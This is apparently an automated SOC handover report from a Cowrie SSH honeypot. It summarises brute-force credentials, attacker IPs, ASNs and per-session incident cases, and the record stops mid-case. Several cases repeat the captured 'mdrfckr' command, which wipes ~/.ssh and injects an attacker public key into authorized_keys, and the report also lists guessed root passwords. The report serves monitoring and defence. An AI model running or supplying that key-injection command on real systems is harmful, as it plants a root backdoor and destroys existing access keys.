# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-24 |
| **Generated At** | 2026-04-24T15:12:16Z |
| **Shift Time** | 15:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **141** |
| Confirmed Threats | **138** |
| False Positives Filtered | **3** (2.1%) |
| Unique Attacker IPs | **9** |
| Countries of Origin | **6** |
| High Severity Cases | **71** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **70** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **137** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **15** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **41** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 71 |
| `345gs5662d34` | 35 |
| `test` | 7 |
| `postgres` | 4 |
| `ubuntu` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 35 |
| `3245gs5662d34` | 35 |
| `test777` | 4 |
| `Aa112211.` | 4 |
| `newpassword123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 35 |
| `root` | `3245gs5662d34` | 35 |
| `test` | `test777` | 4 |
| `root` | `Aa112211.` | 4 |
| `root` | `newpassword123` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root1234!!` | `103.149.27.208` | 2026-04-24T13:43:31 |
| `root` | `3245gs5662d34` | `103.149.27.208` | 2026-04-24T13:43:34 |
| `root` | `newpassword123` | `103.149.27.208` | 2026-04-24T13:45:42 |
| `root` | `zxc123..` | `165.154.6.177` | 2026-04-24T13:46:09 |
| `root` | `3245gs5662d34` | `165.154.6.177` | 2026-04-24T13:46:12 |
| `root` | `QWERTYUIOP` | `165.154.6.177` | 2026-04-24T13:48:01 |
| `root` | `Aa112211.` | `165.154.6.177` | 2026-04-24T13:49:49 |
| `root` | `test1234` | `165.154.6.177` | 2026-04-24T13:51:46 |
| `root` | `vps2026` | `165.154.6.177` | 2026-04-24T13:54:30 |
| `root` | `test1234` | `103.146.202.174` | 2026-04-24T13:55:26 |
| `root` | `3245gs5662d34` | `103.146.202.174` | 2026-04-24T13:55:30 |
| `root` | `Aa112211.` | `209.38.69.153` | 2026-04-24T13:56:11 |
| `root` | `3245gs5662d34` | `209.38.69.153` | 2026-04-24T13:56:17 |
| `root` | `zxc123..` | `103.146.202.174` | 2026-04-24T13:57:32 |
| `root` | `DDdd000` | `209.38.69.153` | 2026-04-24T13:58:06 |
| `root` | `Aa112211.` | `103.146.202.174` | 2026-04-24T13:58:40 |
| `root` | `nPSpP4PBW0` | `209.38.69.153` | 2026-04-24T13:59:04 |
| `root` | `Root6666@123` | `209.38.69.153` | 2026-04-24T13:59:58 |
| `root` | `test1234` | `209.38.69.153` | 2026-04-24T14:01:44 |
| `root` | `QWERTYUIOP` | `103.146.202.174` | 2026-04-24T14:01:47 |
| `root` | `newpassword123` | `209.38.69.153` | 2026-04-24T14:02:35 |
| `root` | `root112233@#` | `103.146.202.174` | 2026-04-24T14:02:50 |
| `root` | `123456789@Abc` | `209.38.69.153` | 2026-04-24T14:03:29 |
| `root` | `newpassword123` | `103.146.202.174` | 2026-04-24T14:06:03 |
| `root` | `root1234!!` | `103.146.202.174` | 2026-04-24T14:07:08 |
| `root` | `nPSpP4PBW0` | `103.146.202.174` | 2026-04-24T14:08:15 |
| `root` | `vps2026` | `209.38.69.153` | 2026-04-24T14:08:54 |
| `root` | `DDdd000` | `103.146.202.174` | 2026-04-24T14:09:27 |
| `root` | `zxc123..` | `209.38.69.153` | 2026-04-24T14:09:49 |
| `root` | `a123456a` | `103.146.202.174` | 2026-04-24T14:10:37 |
| `root` | `QWER123@` | `209.38.69.153` | 2026-04-24T14:10:46 |
| `root` | `vps2026` | `103.146.202.174` | 2026-04-24T14:11:45 |
| `root` | `root112233@#` | `209.38.69.153` | 2026-04-24T14:12:39 |
| `root` | `Root6666@123` | `103.146.202.174` | 2026-04-24T14:12:51 |
| `root` | `123456789@Abc` | `103.146.202.174` | 2026-04-24T14:13:54 |
| `root` | `cde3CDE#vfr4` | `103.146.202.174` | 2026-04-24T14:17:10 |
| `root` | `QWER123@` | `103.146.202.174` | 2026-04-24T14:20:35 |
| `root` | `Test.123` | `103.158.40.65` | 2026-04-24T14:33:54 |
| `root` | `3245gs5662d34` | `103.158.40.65` | 2026-04-24T14:33:57 |
| `root` | `Aa112211.` | `103.158.40.65` | 2026-04-24T14:36:27 |
| `root` | `------fuck------` | `125.73.32.184` | 2026-04-24T14:59:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **141** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 136 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 136 | 5 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 136 | 5 | libssh-based |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 35 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `209.38.69.153`, `103.146.202.174`, `165.154.6.177`, `103.158.40.65`, `103.149.27.208`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **9** |
| Unique ASNs | **7** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS3462` | Data Communication Business Group | 1 | HIGH |
| `AS141319` | Net Hub | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (70)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c714c9fa207c

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:43 |
| **Last Seen** | 2026-04-24 13:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:43:31` | `cowrie.session.connect` |
| `2026-04-24 13:43:31` | `cowrie.client.version` |
| `2026-04-24 13:43:31` | `cowrie.client.kex` |
| `2026-04-24 13:43:31` | `cowrie.login.success` |
| `2026-04-24 13:43:31` | `cowrie.session.params` |
| `2026-04-24 13:43:31` | `cowrie.command.input` |
| `2026-04-24 13:43:31` | `cowrie.command.failed` |
| `2026-04-24 13:43:32` | `cowrie.log.closed` |
| `2026-04-24 13:43:32` | `cowrie.session.params` |
| `2026-04-24 13:43:32` | `cowrie.command.input` |
| `2026-04-24 13:43:32` | `cowrie.session.file_download` |
| `2026-04-24 13:43:32` | `cowrie.log.closed` |
| `2026-04-24 13:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c17d847aa1

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:43 |
| **Last Seen** | 2026-04-24 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:43:34` | `cowrie.session.connect` |
| `2026-04-24 13:43:34` | `cowrie.client.version` |
| `2026-04-24 13:43:34` | `cowrie.client.kex` |
| `2026-04-24 13:43:34` | `cowrie.login.success` |
| `2026-04-24 13:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b409a97d0efd

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:45 |
| **Last Seen** | 2026-04-24 13:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:45:42` | `cowrie.session.connect` |
| `2026-04-24 13:45:42` | `cowrie.client.version` |
| `2026-04-24 13:45:42` | `cowrie.client.kex` |
| `2026-04-24 13:45:42` | `cowrie.login.success` |
| `2026-04-24 13:45:42` | `cowrie.session.params` |
| `2026-04-24 13:45:42` | `cowrie.command.input` |
| `2026-04-24 13:45:42` | `cowrie.command.failed` |
| `2026-04-24 13:45:42` | `cowrie.log.closed` |
| `2026-04-24 13:45:43` | `cowrie.session.params` |
| `2026-04-24 13:45:43` | `cowrie.command.input` |
| `2026-04-24 13:45:43` | `cowrie.session.file_download` |
| `2026-04-24 13:45:43` | `cowrie.log.closed` |
| `2026-04-24 13:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48ca62ae6030

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:45 |
| **Last Seen** | 2026-04-24 13:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:45:45` | `cowrie.session.connect` |
| `2026-04-24 13:45:45` | `cowrie.client.version` |
| `2026-04-24 13:45:45` | `cowrie.client.kex` |
| `2026-04-24 13:45:45` | `cowrie.login.success` |
| `2026-04-24 13:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b1cd214d8f0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:46 |
| **Last Seen** | 2026-04-24 13:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:46:08` | `cowrie.session.connect` |
| `2026-04-24 13:46:08` | `cowrie.client.version` |
| `2026-04-24 13:46:08` | `cowrie.client.kex` |
| `2026-04-24 13:46:09` | `cowrie.login.success` |
| `2026-04-24 13:46:09` | `cowrie.session.params` |
| `2026-04-24 13:46:09` | `cowrie.command.input` |
| `2026-04-24 13:46:09` | `cowrie.command.failed` |
| `2026-04-24 13:46:09` | `cowrie.log.closed` |
| `2026-04-24 13:46:09` | `cowrie.session.params` |
| `2026-04-24 13:46:09` | `cowrie.command.input` |
| `2026-04-24 13:46:09` | `cowrie.session.file_download` |
| `2026-04-24 13:46:09` | `cowrie.log.closed` |
| `2026-04-24 13:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c56238aa2673

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:46 |
| **Last Seen** | 2026-04-24 13:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:46:11` | `cowrie.session.connect` |
| `2026-04-24 13:46:11` | `cowrie.client.version` |
| `2026-04-24 13:46:11` | `cowrie.client.kex` |
| `2026-04-24 13:46:12` | `cowrie.login.success` |
| `2026-04-24 13:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1572080e0bf

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:48 |
| **Last Seen** | 2026-04-24 13:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:48:01` | `cowrie.session.connect` |
| `2026-04-24 13:48:01` | `cowrie.client.version` |
| `2026-04-24 13:48:01` | `cowrie.client.kex` |
| `2026-04-24 13:48:01` | `cowrie.login.success` |
| `2026-04-24 13:48:02` | `cowrie.session.params` |
| `2026-04-24 13:48:02` | `cowrie.command.input` |
| `2026-04-24 13:48:02` | `cowrie.command.failed` |
| `2026-04-24 13:48:02` | `cowrie.log.closed` |
| `2026-04-24 13:48:02` | `cowrie.session.params` |
| `2026-04-24 13:48:02` | `cowrie.command.input` |
| `2026-04-24 13:48:02` | `cowrie.session.file_download` |
| `2026-04-24 13:48:02` | `cowrie.log.closed` |
| `2026-04-24 13:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ff33fa38bd

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:48 |
| **Last Seen** | 2026-04-24 13:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:48:04` | `cowrie.session.connect` |
| `2026-04-24 13:48:04` | `cowrie.client.version` |
| `2026-04-24 13:48:04` | `cowrie.client.kex` |
| `2026-04-24 13:48:04` | `cowrie.login.success` |
| `2026-04-24 13:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296249b14a34

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:49 |
| **Last Seen** | 2026-04-24 13:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:49:48` | `cowrie.session.connect` |
| `2026-04-24 13:49:48` | `cowrie.client.version` |
| `2026-04-24 13:49:48` | `cowrie.client.kex` |
| `2026-04-24 13:49:49` | `cowrie.login.success` |
| `2026-04-24 13:49:49` | `cowrie.session.params` |
| `2026-04-24 13:49:49` | `cowrie.command.input` |
| `2026-04-24 13:49:49` | `cowrie.command.failed` |
| `2026-04-24 13:49:49` | `cowrie.log.closed` |
| `2026-04-24 13:49:49` | `cowrie.session.params` |
| `2026-04-24 13:49:49` | `cowrie.command.input` |
| `2026-04-24 13:49:50` | `cowrie.session.file_download` |
| `2026-04-24 13:49:50` | `cowrie.log.closed` |
| `2026-04-24 13:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3113b50c690

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:49 |
| **Last Seen** | 2026-04-24 13:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:49:51` | `cowrie.session.connect` |
| `2026-04-24 13:49:51` | `cowrie.client.version` |
| `2026-04-24 13:49:52` | `cowrie.client.kex` |
| `2026-04-24 13:49:52` | `cowrie.login.success` |
| `2026-04-24 13:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53adda5591f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:51 |
| **Last Seen** | 2026-04-24 13:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:51:46` | `cowrie.session.connect` |
| `2026-04-24 13:51:46` | `cowrie.client.version` |
| `2026-04-24 13:51:46` | `cowrie.client.kex` |
| `2026-04-24 13:51:46` | `cowrie.login.success` |
| `2026-04-24 13:51:47` | `cowrie.session.params` |
| `2026-04-24 13:51:47` | `cowrie.command.input` |
| `2026-04-24 13:51:47` | `cowrie.command.failed` |
| `2026-04-24 13:51:47` | `cowrie.log.closed` |
| `2026-04-24 13:51:47` | `cowrie.session.params` |
| `2026-04-24 13:51:47` | `cowrie.command.input` |
| `2026-04-24 13:51:47` | `cowrie.session.file_download` |
| `2026-04-24 13:51:47` | `cowrie.log.closed` |
| `2026-04-24 13:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-317c7fb8923c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:51 |
| **Last Seen** | 2026-04-24 13:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:51:49` | `cowrie.session.connect` |
| `2026-04-24 13:51:49` | `cowrie.client.version` |
| `2026-04-24 13:51:49` | `cowrie.client.kex` |
| `2026-04-24 13:51:49` | `cowrie.login.success` |
| `2026-04-24 13:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fae757fbab78

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:54 |
| **Last Seen** | 2026-04-24 13:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
